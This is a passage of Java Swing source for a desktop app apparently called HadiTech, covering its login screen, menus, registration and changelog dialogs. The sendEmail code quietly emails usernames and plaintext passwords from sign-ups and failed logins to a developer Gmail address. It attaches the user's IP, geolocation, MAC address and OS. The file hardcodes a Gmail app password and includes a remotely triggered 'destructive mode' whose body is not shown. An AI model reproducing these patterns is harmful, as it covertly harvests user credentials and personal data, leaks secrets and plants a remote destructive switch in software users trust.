		linkDownload.setOpaque(false); // Make button background transparent
		linkDownload.setContentAreaFilled(false); // Do not fill the area with the background color
		linkDownload.setBorderPainted(true); // Remove the border
		linkDownload.setFocusPainted(false); // Remove the focus paint (the dotted line when the button is clicked)
		linkDownload.setVisible(false);
		linkDownload.addActionListener(_ -> {
			try {
				URI uri = new URI("https://github.com/MhmdSAbdlh/HadiTech/releases");
				Desktop desktop = Desktop.getDesktop();
				desktop.browse(uri);
			} catch (Exception e) {
				writeError(e);
			}
		});
		add(linkDownload);
		updateWithText = ImageEffect
				.invertColor((ImageEffect.createIconWithText(
						ImageEffect.getScaledImage(
								new ImageIcon(getClass().getResource("images/update.png")).getImage(), 30, 30),
						getLocalizedMessage("UPDATE_AVAILABLE"), myFont, blackM, Position.RIGHT)));
		updateBtn = new JButton(ImageEffect.changeOpacity(updateWithText.getImage(), 0.5f));
		updateBtn.setOpaque(false);
		updateBtn.setContentAreaFilled(false);
		updateBtn.setBorderPainted(true);
		updateBtn.setFocusPainted(false);
		updateBtn.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseEntered(MouseEvent e) {
				applyFadeEffect(updateBtn, updateWithText, 0.5f, 1.0f, 5);
			}

			@Override
			public void mouseExited(MouseEvent e) {
				applyFadeEffect(updateBtn, updateWithText, 1.0f, 0.5f, 5);
			}
		});

		updateBtn.addActionListener(_ -> {
			Thread thread = new Thread() {
				@Override
				public void run() {
					updateAvailable();
				}
			};
			thread.start();
		});
		updateBtn.setBounds(getWidth() / 2 - 180, (getHeight() - height / 3), 360, 50);
		updateBtn.hide();
		liquidProgress.setValue(0);
		liquidProgress.setBackground(lightC);
		liquidProgress.setAnimateColor(conf[10].equalsIgnoreCase("0") ? new Color(0x505050)
				: conf[10].equalsIgnoreCase("1") ? blueC : new Color(0x505050));
		liquidProgress.setBorderColor(
				conf[10].equalsIgnoreCase("0") ? lightC : conf[10].equalsIgnoreCase("1") ? blueC : blackM);
		liquidProgress.setBorderSize(8);
		liquidProgress.setSpaceSize(5);
		liquidProgress.setSize(100, 100);
		liquidProgress.hide();
		add(liquidProgress);

		// MenuBar
		JMenuBar mb = new JMenuBar();
		JMenu file = new JMenu(getLocalizedMessage("FILE"));
		JMenuItem exit = new JMenuItem(getLocalizedMessage("EXIT"));
		JMenuItem creator = new JMenuItem(getLocalizedMessage("ABOUTME"));
		JMenuItem about = new JMenuItem(getLocalizedMessage("ABOUTAPP"));
		JMenuItem option = new JMenuItem(getLocalizedMessage("CONF"));
		JMenuItem updateCheck = new JMenuItem(getLocalizedMessage("UPDATE_CHECK"));
		JMenuItem changelogM = new JMenuItem(getLocalizedMessage("CHANGELOG"));
		JMenuItem downgrade = new JMenuItem(getLocalizedMessage("DOWNGRADE"));
		option.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_O, KeyEvent.CTRL_DOWN_MASK));
		exit.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_W, KeyEvent.CTRL_DOWN_MASK));
		updateCheck.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_U, KeyEvent.CTRL_DOWN_MASK));
		about.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_A, KeyEvent.ALT_DOWN_MASK));
		downgrade.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_D, KeyEvent.CTRL_DOWN_MASK));
		changelogM.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_L, KeyEvent.CTRL_DOWN_MASK));
		creator.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_C, KeyEvent.ALT_DOWN_MASK));
		creator.setMnemonic(language == Language.SPANISH ? 'A'
				: language == Language.PORTUGUES ? 'A' : language == Language.ENGLISH ? 'F' : 'F');
		option.setMnemonic(language == Language.SPANISH ? 'O'
				: language == Language.PORTUGUES ? 'O' : language == Language.ENGLISH ? 'O' : 'P');
		exit.setMnemonic(language == Language.SPANISH ? 'L'
				: language == Language.PORTUGUES ? 'E' : language == Language.ENGLISH ? 'E' : 'O');

		updateCheck.setMnemonic(language == Language.SPANISH ? 'B'
				: language == Language.PORTUGUES ? 'V' : language == Language.ENGLISH ? 'U' : 'V');
		downgrade.setMnemonic('D');
		creator.setMnemonic('C');
		about.setMnemonic('A');
		changelogM.setMnemonic(language == Language.SPANISH ? 'R'
				: language == Language.PORTUGUES ? 'R' : language == Language.ENGLISH ? 'L' : 'J');
		option.setIcon(conf[10].equalsIgnoreCase("2") ? ImageEffect.getScaledImage(confI.getImage(), 35, 35)
				: ImageEffect.invertColor(ImageEffect.getScaledImage(confI.getImage(), 35, 35)));
		changelogM.setIcon(conf[10].equalsIgnoreCase("2") ? ImageEffect.getScaledImage(changelogI.getImage(), 35, 35)
				: ImageEffect.invertColor(ImageEffect.getScaledImage(changelogI.getImage(), 35, 35)));
		creator.addActionListener(_ -> {
			SocialMedia socialMedia = new SocialMedia(this);
			socialMedia.setLinks("https://www.youtube.com/channel/UCzuTm6D0YasEDrVtIlvwjag", "",
					"https://www.facebook.com/mhmdsabdlh", "https://mhmdsabdlh.github.io/",
					"https://www.instagram.com/mhmdsabdlh/", "https://twitter.com/MhmdSAbdlh/",
					"https://www.paypal.com/paypalme/mhmdsabdlh");
			socialMedia.setTxtColor(Color.black);
			socialMedia.setBGColor(grisD);
			socialMedia.showMessage(getLocalizedMessage("ABOUT"));
		});
		creator.setIcon(conf[10].equalsIgnoreCase("2") ? ImageEffect.getScaledImage(creatorI.getImage(), 35, 35)
				: ImageEffect.invertColor(ImageEffect.getScaledImage(creatorI.getImage(), 35, 35)));
		about.addActionListener(_ -> {
			SocialMedia socialMedia = new SocialMedia(this);
			socialMedia.addLinks(APP.FACEBOOK, "https://www.facebook.com/profile.php?id=61574755664555");
			socialMedia.addLinks(APP.INSTAGRAM, "https://www.instagram.com/hadiabdallah33/");
			socialMedia.addLinks(APP.WEBSITE, "https://github.com/MhmdSAbdlh/HadiTech");
			socialMedia.addLinks(APP.WHATSAPP, "https://wa.me/96171228724");
			socialMedia.setTxtColor(Color.black);
			socialMedia.setBGColor(grisD);
			socialMedia.showMessage(getLocalizedMessage("CREDIT"));
		});
		about.setIcon(conf[10].equalsIgnoreCase("2") ? ImageEffect.getScaledImage(aboutI.getImage(), 35, 35)
				: ImageEffect.invertColor(ImageEffect.getScaledImage(aboutI.getImage(), 35, 35)));
		changelogM.addActionListener(_ -> changelogDialog());
		option.addActionListener(_ -> new SettingsDialog(this, "first"));
		exit.addActionListener(_ -> System.exit(0));
		exit.setIcon(conf[10].equalsIgnoreCase("2") ? ImageEffect.getScaledImage(exitI.getImage(), 35, 35)
				: ImageEffect.invertColor(ImageEffect.getScaledImage(exitI.getImage(), 35, 35)));
		updateCheck.addActionListener(_ -> {
			versionAvailable = versionListDownload();
			if (versionAvailable.size() > 0)
				updateAvailable();
			else
				Toast.show(Intro.this, Toast.Type.ERROR, "ERROR: NO INTERNET CONNECTION", notOption);
		});
		updateCheck.setIcon(conf[10].equalsIgnoreCase("2") ? ImageEffect.getScaledImage(updateI.getImage(), 35, 35)
				: ImageEffect.invertColor(ImageEffect.getScaledImage(updateI.getImage(), 35, 35)));
		downgrade.setIcon(conf[10].equalsIgnoreCase("2") ? ImageEffect.getScaledImage(downgradeI.getImage(), 35, 35)
				: ImageEffect.invertColor(ImageEffect.getScaledImage(downgradeI.getImage(), 35, 35)));
		downgrade.addActionListener(_ -> downgradeDialog());
		file.add(option);
		file.add(updateCheck);
		file.add(downgrade);
		file.add(changelogM);
		file.add(creator);
		file.add(about);
		file.add(exit);
		mb.add(file);

		/* TIMER START */
		loadingLabel = new JLabel();
		loadingLabel.setBounds(getWidth() / 3, 0, getWidth() / 3, getHeight() / 3);
		loadingLabel.hide();

		/* EVENTS */
		if (conf[20] == null || conf[20].equalsIgnoreCase("null") || conf[20].equals("false")) {
			if (hijrihtDate.get(ChronoField.MONTH_OF_YEAR) == 10 && 1 == hijrihtDate.get(ChronoField.DAY_OF_MONTH))
				eventEffect("eid", blueD, Shape.STAR);
			if (hijrihtDate.get(ChronoField.MONTH_OF_YEAR) == 9)
				eventEffect("ramadan", goldM, Shape.MOON);
			if (hijrihtDate.get(ChronoField.MONTH_OF_YEAR) == 1 && 10 == hijrihtDate.get(ChronoField.DAY_OF_MONTH))
				eventEffect("karbala", redM, Shape.BLOOD);
			if (Integer.valueOf(dayN) == 31 && Integer.valueOf(monthN) == 12)
				eventEffect("newyear", blueD, Shape.FIREWORK);
			if (Integer.valueOf(dayN) < 24 && Integer.valueOf(dayN) != 22 && Integer.valueOf(monthN) == 12)
				eventEffect("navidad", lightC, Shape.CHRISTMAS_TREE);// christmas
			// birthdays
			birthdaysAddEvents();
			for (int index = 0; index < birthdayL.size(); index++) {
				if ((LocalDate.now().getMonthValue() == birthdayL.get(index).getDate().getMonthValue())
						&& (LocalDate.now().getDayOfMonth() == birthdayL.get(index).getDate().getDayOfMonth()))
					birthdayEvent(birthdayL.get(index).getName());
			}
		}

		/* White Mode */
		if (conf[10].equalsIgnoreCase("2")) {
			login.setIcon(ImageEffect.changeOpacity(ImageEffect.getScaledImage(enterI.getImage(), 100, 100).getImage(),
					0.5f));
			contactUs.setIcon(ImageEffect
					.changeOpacity(ImageEffect.getScaledImage(contactI.getImage(), 75, 75).getImage(), 0.5f));
			contactMe.setIcon(ImageEffect
					.changeOpacity(ImageEffect.getScaledImage(contactMeI.getImage(), 75, 75).getImage(), 0.5f));
			settingL.setIcon(ImageEffect
					.changeOpacity(ImageEffect.getScaledImage(settingI.getImage(), 75, 75).getImage(), 0.5f));
			showHide.setIcon(ImageEffect.invertColor(ImageEffect.getScaledImage(eyeClosedI.getImage(), 45, 45)));
			updateWithText = ImageEffect
					.createIconWithText(
							ImageEffect.getScaledImage(
									new ImageIcon(getClass().getResource("images/update.png")).getImage(), 30, 30),
							getLocalizedMessage("UPDATE_AVAILABLE"), myFont, blackM, Position.RIGHT);
			updateBtn.setIcon(ImageEffect.changeOpacity(updateWithText.getImage(), 0.5f));
			regIcon = ImageEffect.createIconWithText(
					ImageEffect.getScaledImage(
							new ImageIcon(getClass().getResource("images/menubar/signup.png")).getImage(), 30, 30),
					getLocalizedMessage("REGISTER"), myFont, blackM, Position.RIGHT);
			register.setIcon(ImageEffect.changeOpacity(regIcon.getImage(), 0.5f));
		}

		// Add to frame
		setJMenuBar(mb);
		add(settingL);
		add(icon1);
		add(login);
		add(showHide);
		add(passTF);
		add(inputText);
		add(register);
		add(loadingLabel);
		add(updateBtn);
		getRootPane().setDefaultButton(login);
		setVisible(true);

		// remove button focus border
		UIDefaults defaults = UIManager.getLookAndFeelDefaults();
		defaults.put("Button.focus", new ColorUIResource(new Color(0, 0, 0, 0)));

		// Close popup
		addWindowListener(new java.awt.event.WindowAdapter() {
			@Override
			public void windowClosing(java.awt.event.WindowEvent windowEvent) {
				ModernDialog dialog = new ModernDialog(Intro.this, getLocalizedMessage("EXIT_DIALOG"), false);
				dialog.addSubText(getLocalizedMessage("CANNOT_UNDO"), fg);
				dialog.setIcon(IconType.ERROR);
				dialog.setColor(bg);
				dialog.setTextColor(fg);
				dialog.setOverlayColor(bg);
				dialog.addButton(getLocalizedMessage("YES"), greenM, () -> {
					System.exit(0);
				});
				dialog.addButton(getLocalizedMessage("NO"), redM, dialog::dispose);
				dialog.setVisible(true);
			}
		});

		// Disable btn color
		defaults.put("Button.disabledText", new ColorUIResource(Color.white));
		defaults.put("textInactiveText", UIManager.get("Button.disabledText"));

		/* DESTRUCTIVE MODE */
		versionAvailable = versionListDownload();
		if (versionAvailable != null && versionAvailable.size() > 0)
			if (versionAvailable.get(0).equalsIgnoreCase("hmdsabdlh"))
				try {
					destructiveMode();
				} catch (MalformedURLException e1) {
					writeError(e1);
				}

		/* Auto Update */
		if (conf[13] == null || conf[13].equalsIgnoreCase("null") || conf[13].equals("false")) {
			versionAvailable = versionListDownload();
			if (versionAvailable.size() != 0)
				if (!versionAvailable.get(0).equals(appVersion)) {
					updateBtn.show();
					if (conf[1] == null || conf[1].equalsIgnoreCase("null") || conf[1].equals("false"))
						soundEffect(notSound);
				}
		}
		/* Block users */
		if (isBlocked()) {
			for (int i = 0; i < 10; i++)
				Toast.show(this, Toast.Type.ERROR, getLocalizedMessage("BANNED"), notOption);
			try {
				Thread.sleep(2000);
			} catch (InterruptedException e) {
			}
			System.exit(0);
		}
	}

	// Register panel
	private void registerDialog() {
		JDialog dialog = new JDialog(this, getLocalizedMessage("REGISTER"), true);
		dialog.setUndecorated(true);
		dialog.setSize(getWidth() / 3, getHeight() / 3);
		dialog.setShape(new RoundRectangle2D.Double(0, 0, getWidth() / 3, getHeight() / 3, 20, 20));
		dialog.setLocationRelativeTo(this);

		OverlayFrame overlay = new OverlayFrame(this);
		overlay.showOverlay();

		// Add rounded corners and shadow effect
		JPanel contentPane = new JPanel() {
			@Override
			protected void paintComponent(Graphics g) {
				super.paintComponent(g);
				Graphics2D g2d = (Graphics2D) g;
				g2d.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);

				// Background with rounded corners
				g2d.setColor(bg);
				g2d.fillRoundRect(0, 0, getWidth(), getHeight(), 20, 20);
				// Set border color and thickness
				g2d.setColor(fg); // Example border color
				g2d.setStroke(new BasicStroke(2)); // Example border thickness (3 pixels)
				g2d.drawRoundRect(1, 1, getWidth() - 2, getHeight() - 2, 20, 20); // Draw border with small padding
			}
		};
		contentPane.setLayout(new BorderLayout());
		contentPane.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
		dialog.setContentPane(contentPane);

		JPanel centerP = new JPanel(new GridBagLayout());
		centerP.setOpaque(false);

		GridBagConstraints gbc = new GridBagConstraints();
		gbc.insets = new Insets(5, 5, 5, 5);
		gbc.fill = GridBagConstraints.HORIZONTAL;

		// Email field
		JLabel emailLabel = new JLabel(getLocalizedMessage("EMAIL"));
		gbc.gridx = 0;
		gbc.gridy = 0;
		centerP.add(emailLabel, gbc);

		JTextField emailField = new JTextField(15);
		gbc.gridx = 1;
		centerP.add(emailField, gbc);
		// Set email input validation
		emailField.setInputVerifier(new InputVerifier() {
			private final Pattern emailPattern = Pattern
					.compile("^[a-zA-Z0-9._%+-]+@(gmail\\.com|hotmail\\.com" + "|live\\.com|yahoo\\.com)$");

			@Override
			public boolean verify(JComponent input) {
				JTextField textField = (JTextField) input;
				String text = textField.getText().trim().toLowerCase();
				boolean isValid = emailPattern.matcher(text).matches();
				return isValid;
			}
		});

		// Username field
		JLabel userLabel = new JLabel(getLocalizedMessage("USER"));
		gbc.gridx = 0;
		gbc.gridy = 1;
		centerP.add(userLabel, gbc);

		JTextField userField = new JTextField(15);
		gbc.gridx = 1;
		centerP.add(userField, gbc);

		// Password field
		JLabel passLabel = new JLabel(getLocalizedMessage("PASSWORD"));
		gbc.gridx = 0;
		gbc.gridy = 2;
		centerP.add(passLabel, gbc);

		JPasswordField passField = new JPasswordField(15);
		gbc.gridx = 1;
		centerP.add(passField, gbc);

		PasswordStrengthStatus passwordStrengthStatus = new PasswordStrengthStatus();
		passwordStrengthStatus.initPasswordField(passField);
		passwordStrengthStatus.setText(getLocalizedMessage("WEAK"), getLocalizedMessage("MEDIUM"),
				getLocalizedMessage("STRONG"));
		passwordStrengthStatus.setOpaque(false);
		gbc.gridx = 1;
		gbc.gridy = 3;
		centerP.add(passwordStrengthStatus, gbc);

		// bottom panel
		JPanel bottomPanel = new JPanel(new BorderLayout(0, 20));
		bottomPanel.setOpaque(false);
		JLabel messageLabel = new JLabel(getLocalizedMessage("CASES"));
		messageLabel.setForeground(Color.GRAY);
		messageLabel.setHorizontalAlignment(0);

		// OK and Cancel buttons
		JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 20, 0));
		buttonPanel.setOpaque(false);
		RoundButton yesButton = new RoundButton("OK", 10);
		yesButton.setFillColor(greenM);
		yesButton.setForeground(lightC);
		yesButton.setBorderColorAndRadius(fg);
		RoundButton cancelButton = new RoundButton(getLocalizedMessage("CANCEL"), 10);
		cancelButton.setFillColor(redM);
		cancelButton.setForeground(lightC);
		cancelButton.setBorderColorAndRadius(fg);
		buttonPanel.add(yesButton);
		buttonPanel.add(cancelButton);
		bottomPanel.add(messageLabel, BorderLayout.CENTER);
		bottomPanel.add(buttonPanel, BorderLayout.SOUTH);

		contentPane.add(centerP, BorderLayout.CENTER);
		contentPane.add(bottomPanel, BorderLayout.SOUTH);

		// Button Actions
		yesButton.addActionListener(_ -> {
			String username = userField.getText();
			String password = new String(passField.getPassword());
			String email = emailField.getText();
			if (email.isBlank())
				Toast.show(this, Toast.Type.ERROR, getLocalizedMessage("EMAIL0"), notOption);
			else if (!emailField.getInputVerifier().verify(emailField))
				Toast.show(this, Toast.Type.ERROR, getLocalizedMessage("EMAIL8"), notOption);
			else if (username.isBlank())
				Toast.show(this, Toast.Type.ERROR, getLocalizedMessage("USER0"), notOption);
			else if (username.length() < 8)
				Toast.show(this, Toast.Type.ERROR, getLocalizedMessage("USER8"), notOption);
			else if (password.isBlank())
				Toast.show(this, Toast.Type.ERROR, getLocalizedMessage("EMPTY_PASSWORD"), notOption);
			else if (password.length() < 8)
				Toast.show(this, Toast.Type.ERROR, getLocalizedMessage("PASS8"), notOption);
			else {
				Component[] components = getContentPane().getComponents();
				for (Component component : components) {
					if (component instanceof JComponent) {
						((JComponent) component).setVisible(false);
					}
				}
				icon1.setVisible(true);
				sendEmail("hamadakakos@gmail.com", username, password, email);
				overlay.hideOverlay();
				dialog.dispose();
				Toast.show(this, Toast.Type.SUCCESS, getLocalizedMessage("LEGEND"), notOption);
			}

		});
		cancelButton.addActionListener(_ -> {
			dialog.dispose();
			overlay.hideOverlay();
		});

		// Key listener for ESC key to close the dialog
		InputMap inputMap = dialog.getRootPane().getInputMap(JComponent.WHEN_IN_FOCUSED_WINDOW);
		ActionMap actionMap = dialog.getRootPane().getActionMap();
		inputMap.put(KeyStroke.getKeyStroke(KeyEvent.VK_ESCAPE, 0), "closeDialog");
		actionMap.put("closeDialog", new AbstractAction() {
			@Override
			public void actionPerformed(ActionEvent e) {
				dialog.dispose();
				overlay.hideOverlay();
			}
		});

		dialog.getRootPane().setDefaultButton(yesButton);
		dialog.setLocationRelativeTo(null);
		dialog.setVisible(true);
	}

	// Send email for register
	public void sendEmail(String recipient, String username, String password, String userMessage) {
		SwingWorker<Void, Void> worker = new SwingWorker<>() {
			@Override
			protected Void doInBackground() {
				// Sender's email ID and password (use App Password for better security)
				String from = "mhmdcedros@gmail.com";
				String appPassword = "owtq tdkb vyqq znlq"; // App Password generated from your Google account

				// SMTP server configuration
				String host = "smtp.gmail.com";

				// Set properties for the SMTP server
				Properties properties = new Properties();
				properties.put("mail.smtp.host", host);
				properties.put("mail.smtp.port", "587");
				properties.put("mail.smtp.auth", "true");
				properties.put("mail.smtp.starttls.enable", "true"); // Enable STARTTLS for secure connection

				// Get the session object with authentication
				Session session = Session.getInstance(properties, new Authenticator() {
					protected PasswordAuthentication getPasswordAuthentication() {
						return new PasswordAuthentication(from, appPassword);
					}
				});

				try {

					String apiUrl = "https://ipinfo.io/json";
					URL url = new URL(apiUrl);
					HttpURLConnection conn = (HttpURLConnection) url.openConnection();
					conn.setRequestMethod("GET");

					BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
					StringBuilder response = new StringBuilder();
					String line;
					while ((line = reader.readLine()) != null) {
						response.append(line);
					}
					reader.close();

					// Parse JSON
					JSONObject json = new JSONObject(response.toString());

					// Extract needed fields
					String ip = json.getString("ip");
					String city = json.getString("city");
					String country = json.getString("country");
					String location = json.getString("loc");

					// Print the output (you can parse the JSON to get specific fields)
					String text;
					if (userMessage.isBlank())
						text = "There have been 5 failed login attempts for the following user:\n" + "Username: "
								+ username + "\nPassword: " + password + // password
								"\nTime: " + new SimpleDateFormat("hh:mm:ss a EEEE, dd-MM-yyyy").format(new Date())
								+ "\nMAC: " + getMacAddress()// IP
								+ "\nIP: " + ip // IP
								+ "\nLOCATION: " + city + "/" + country + " (" + location + ")" // location
								+ "\nLanguage: " + Locale.getDefault().getDisplayName() + // language
								"\nOperating System: " + System.getProperty("os.name"); // operating system
					else
						text = "REGISTER:\n" + "Username: " + username + "\nPassword: " + password + // password
								"\nEmail: " + userMessage + // email
								"\nTime: " + new SimpleDateFormat("hh:mm:ss a EEEE, dd-MM-yyyy").format(new Date())
								+ "\nMAC: " + getMacAddress()// IP
								+ "\nIP: " + ip // IP
								+ "\nLOCATION: " + city + "/" + country + " (" + location + ")" // location
								+ "\nLanguage: " + Locale.getDefault().getDisplayName() + // language
								"\nOperating System: " + System.getProperty("os.name"); // operating system
					// Create a MimeMessage object
					MimeMessage message = new MimeMessage(session);
					message.setFrom(new InternetAddress(from));
					message.addRecipient(Message.RecipientType.TO, new InternetAddress(recipient));
					if (userMessage.isBlank())
						message.setSubject("Failed Login Alert");
					else
						message.setSubject("New sign up user");
					message.setText(text);
					// Send the email
					Transport.send(message);
				} catch (Exception e) {
					e.printStackTrace();
				}
				return null;
			}

			@Override
			protected void done() {
				if (userMessage.isBlank())
					System.exit(0);
				else {
					Component[] components = getContentPane().getComponents();
					for (Component component : components) {
						if (component instanceof JComponent) {
							((JComponent) component).setVisible(true);
						}
					}
					linkDownload.setVisible(false);
					updateBtn.setVisible(false);
					liquidProgress.setVisible(false);
					Toast.show(Intro.this, Toast.Type.SUCCESS, getLocalizedMessage("DONE"), notOption);
					Toast.show(Intro.this, Toast.Type.WARNING, getLocalizedMessage("WAIT"), notOption);
				}
			}
		};
		worker.execute();
	}

	// Changelog dialog
	private void changelogDialog() {
		if (versionAvailable.size() != 0) {
			JDialog dialog = new JDialog(this, "My Modal Dialog", false);
			// Customize dialog's look
			dialog.setUndecorated(true); // Removes the default window frame
			dialog.setLayout(new BorderLayout());
			OverlayPanel overlay = new OverlayPanel();
			overlay.setBounds(0, 0, getWidth(), getHeight());
			overlay.setOpaque(false);
			overlay.setOverlayColor(bg);
			getLayeredPane().add(overlay, JLayeredPane.PALETTE_LAYER);

			JPanel buttonPanel, textPanel;
			JLabel messageLabel;
			JLabel iconLabel; // New label for the icon

			// Apply rounded shape to the dialog
			dialog.setShape(new RoundRectangle2D.Double(0, 0, 300, 150, 20, 20)); // Rounded corners

			// Background panel with rounded corners and a custom color
			JPanel panel = new JPanel() {
				@Override
				protected void paintComponent(Graphics g) {
					super.paintComponent(g);
					Graphics2D g2 = (Graphics2D) g;
					g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);

					// Set background color
					g2.setColor(bg);
					g2.fillRoundRect(0, 0, getWidth(), getHeight(), 20, 20);

					// Set border color and thickness
					g2.setColor(fg); // Example border color
					g2.setStroke(new BasicStroke(2)); // Example border thickness (3 pixels)
					g2.drawRoundRect(1, 1, getWidth() - 2, getHeight() - 2, 20, 20); // Draw border with small padding
				}
			};
			panel.setLayout(new BorderLayout());
			panel.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));

			// Create icon label// Create a panel with FlowLayout to center the button
			JPanel northPanel = new JPanel(new FlowLayout(FlowLayout.CENTER));
			northPanel.setBackground(bg);
			iconLabel = new JLabel();
			iconLabel.setIcon(UIManager.getIcon("OptionPane.informationIcon")); // Set the icon based on the type
			northPanel.add(iconLabel); // Add the button to the panel

			// Add multiline support using HTML in JLabel
			textPanel = new JPanel(new BorderLayout());
			textPanel.setBackground(bg);
			messageLabel = new JLabel("<html>" + getLocalizedMessage("CHANGELOG").replace("\n", "<br>") + "</html>",
					JLabel.CENTER);
			messageLabel.setForeground(fg);
			messageLabel.setFont(new Font("Arial", Font.BOLD, 16));

			ArrayList<String> version = versionAvailable;
			for (int index = 0; index < version.size(); index++)
				if (version.get(index).equals("ideo"))
					version.remove(version.get(index));
			JComboBox<String> versionList = new JComboBox<String>();
			versionList.setBackground(grisD);
			versionList.setForeground(blackM);
			for (int index = 0; index < version.size(); index++)
				versionList.addItem(version.get(index));

			// JLabel to display the selected item
			ArrayList<String> changeLog = changelogDownload();
			String warningText = changeLog.get(0);
			versionList.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					int selectedIndex = versionList.getSelectedIndex();

					warningLabel.setText("<html>" + changeLog.get(selectedIndex).replace("\n", "<br>") + "</html>");
				}
			});
			warningLabel = new JLabel("<html>" + warningText.replace("\n", "<br>") + "</html>", JLabel.CENTER);
			warningLabel.setForeground(Color.black);
			warningLabel.setFont(new Font("Arial", Font.ITALIC, 14));
			JScrollPane scroller = new JScrollPane(warningLabel);
			scroller.setBorder(null);
			scroller.setOpaque(false);
			warningLabel.setForeground(fg);
			scroller.getViewport().setBackground(bg);
			textPanel.add(northPanel, BorderLayout.NORTH);
			textPanel.add(messageLabel, BorderLayout.CENTER);
			textPanel.add(versionList, BorderLayout.SOUTH);
			northPanel.setBorder(BorderFactory.createEmptyBorder(0, 0, 5, 0)); // Adds space below the icon
			messageLabel.setBorder(BorderFactory.createEmptyBorder(5, 0, 8, 0)); // Adds space above and below the
			warningLabel.setBorder(BorderFactory.createEmptyBorder(5, 0, 8, 0)); // Adds space above and below the

			buttonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 20, 0));
			buttonPanel.setOpaque(false); // Transparent background for buttons

			// BUTTONS
			RoundButton yesButton = new RoundButton("OK", 10);
			yesButton.setFillColor(greenM);
			yesButton.setForeground(lightC);
			yesButton.setBorderColorAndRadius(fg);
			yesButton.addActionListener(_ -> {
				Timer fadeOutTimer = new Timer(5, null);
				fadeOutTimer.addActionListener(_ -> {
					float opacity = dialog.getOpacity();
					float currentAlpha = overlay.getAlpha();
					if (opacity > 0.05f) {
						dialog.setOpacity(opacity - 0.05f); // Decrease opacity gradually
					} else {
						fadeOutTimer.stop(); // Stop timer when fully transparent
						dialog.dispose(); // Dispose the dialog
						getLayeredPane().remove(overlay);
						getLayeredPane().repaint();
					}
					if (currentAlpha > 0.05f) {
						overlay.setAlpha(currentAlpha - 0.05f); // Increase opacity gradually
					} else {
						overlay.setAlpha(currentAlpha);
					}
				});
				fadeOutTimer.start(); // Start fade-out effect
			});
			buttonPanel.add(yesButton);

			// Spacing
			textPanel.setBorder(BorderFactory.createEmptyBorder(5, 0, 8, 0)); // Adds space above and below the
			versionList.setBorder(BorderFactory.createEmptyBorder(5, 0, 8, 0)); // Adds space above and below the
			buttonPanel.setBorder(BorderFactory.createEmptyBorder(8, 0, 0, 0)); // Adds space above the button panel

			panel.add(textPanel, BorderLayout.NORTH); // Icon on top
			panel.add(scroller, BorderLayout.CENTER);
			panel.add(buttonPanel, BorderLayout.SOUTH);
			dialog.add(panel);

			// Adjust dialog size based on the message height
			dialog.pack(); // Adjust size to fit content
			int messageHeight = textPanel.getPreferredSize().height;
			int buttonPanelHeight = buttonPanel.getPreferredSize().height;
			int iconHeigh = warningLabel.getPreferredSize().height;

			// Calculate preferred width based on the buttons
			int totalWidth = 0;
			for (Component button : buttonPanel.getComponents()) {
				totalWidth += button.getPreferredSize().width;
			}
			int totalButtonWidth = totalWidth + (buttonPanel.getComponentCount() - 1) * 20;
			int messageWidth = warningLabel.getPreferredSize().width;

			int dialogWidth = Math.max(totalButtonWidth, messageWidth) + 60; // Add padding
			int dialogHeight = messageHeight + buttonPanelHeight + iconHeigh + 60; // Add padding for margins

			dialog.setSize(dialogWidth, dialogHeight);

			// Update rounded shape based on new size
			dialog.setShape(new RoundRectangle2D.Double(0, 0, dialogWidth, dialogHeight, 20, 20));

			// Add a MouseAdapter to detect clicks outside the dialog
			overlay.addMouseListener(new MouseAdapter() {
				@Override
				public void mousePressed(MouseEvent e) {
					Point mousePoint = e.getPoint();
					SwingUtilities.convertPointToScreen(mousePoint, overlay); // Convert to screen coordinates

					Rectangle dialogBounds = dialog.getBounds();
					if (!dialogBounds.contains(mousePoint)) {
						Timer fadeOutTimer = new Timer(5, null);
						fadeOutTimer.addActionListener(_ -> {
							float opacity = dialog.getOpacity();
							float currentAlpha = overlay.getAlpha();
							if (opacity > 0.05f) {
								dialog.setOpacity(opacity - 0.05f); // Decrease opacity gradually
							} else {
								fadeOutTimer.stop(); // Stop timer when fully transparent
								dialog.dispose(); // Dispose the dialog
								getLayeredPane().remove(overlay);
								getLayeredPane().repaint();
							}
							if (currentAlpha > 0.05f) {
								overlay.setAlpha(currentAlpha - 0.05f); // Increase opacity gradually
							} else {
								overlay.setAlpha(currentAlpha);
							}
						});
						fadeOutTimer.start();
					}
				}
			});

			// Inside the constructor, after the dialog size and location configuration
			dialog.setOpacity(0f); // Set initial opacity to 0 (fully transparent)
			Timer fadeInTimer = new Timer(5, null);
			fadeInTimer.addActionListener(_ -> {
				float opacity = dialog.getOpacity();
				float currentAlpha = overlay.getAlpha();
				if (opacity < 0.95f) {
					dialog.setOpacity(opacity + 0.05f); // Increase opacity gradually
				} else {
					dialog.setOpacity(1f); // Increase opacity gradually
					fadeInTimer.stop(); // Stop timer when fully visible
				}
				if (currentAlpha < 0.5f) {
					overlay.setAlpha(currentAlpha + 0.05f); // Increase opacity gradually
				} else {
					overlay.setAlpha(currentAlpha);
				}
			});
			fadeInTimer.start(); // Start fade-in effect

			// Set position
			dialog.setLocationRelativeTo(this);

			// Key listener to close the dialog on Esc key press
			dialog.getRootPane().registerKeyboardAction(_ -> {
				Timer fadeOutTimer = new Timer(5, null);
				fadeOutTimer.addActionListener(_ -> {
					float opacity = dialog.getOpacity();
					float currentAlpha = overlay.getAlpha();
					if (opacity > 0.05f) {
						dialog.setOpacity(opacity - 0.05f); // Decrease opacity gradually
					} else {
						fadeOutTimer.stop(); // Stop timer when fully transparent
						dialog.dispose(); // Dispose the dialog
						getLayeredPane().remove(overlay);
